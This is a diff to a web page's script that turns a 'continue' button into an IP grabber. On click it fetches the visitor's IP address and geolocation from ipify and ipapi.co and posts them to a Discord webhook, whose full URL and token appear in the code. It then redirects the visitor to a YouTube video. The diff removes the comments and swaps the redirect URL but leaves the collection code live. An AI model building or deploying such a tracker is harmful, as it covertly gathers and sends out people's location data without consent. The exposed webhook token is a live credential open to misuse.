@@ -60,25 +60,25 @@
 
     <script>
         document.getElementById('continueBtn').addEventListener('click', function() {
-            // Disable button to prevent multiple clicks
+            
             this.disabled = true;
             this.textContent = 'Loading...';
             
-            // Fetch IP information from ip-api.com (using HTTPS)
+            
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(ipData => {
                     const ipAddress = ipData.ip;
                     
-                    // Get detailed information about the IP
+                    
                     return fetch(`https://ipapi.co/${ipAddress}/json/`)
                         .then(response => response.json())
                         .then(data => {
-                            // Prepare data for Discord webhook
+                            
                             const webhookData = {
                                 embeds: [{
                                     title: "IP Information Collected",
-                                    color: 5814783, // Purple color
+                                    color: 5814783, 
                                     fields: [
                                         { name: "IP Address", value: ipAddress, inline: true },
                                         { name: "Country", value: data.country_name || "Unknown", inline: true },
@@ -94,7 +94,7 @@
                                 }]
                             };
                             
-                            // Send data to Discord webhook
+                            
                             return fetch('https://discord.com/api/webhooks/1358863296920289572/Jk0S1qOwoW2xrKL_GT33f_ubYJoPIvLB7ljXWnZdtkayAameCaG2ZBaLz7gQ9TcFpuCi', {
                                 method: 'POST',
                                 headers: {
@@ -105,12 +105,12 @@
                         });
                 })
                 .then(() => {
-                    // Update button after successful submission
+                    
                     document.getElementById('continueBtn').textContent = 'Thank you!';
                     
-                    // Redirect to another page or perform additional actions
+                    
                     setTimeout(() => {
-                        window.location.href = "https://umbx.pages.dev/"; // Replace with your desired URL
+                        window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0"; 
                     }, 1500);
                 })
                 .catch(error => {
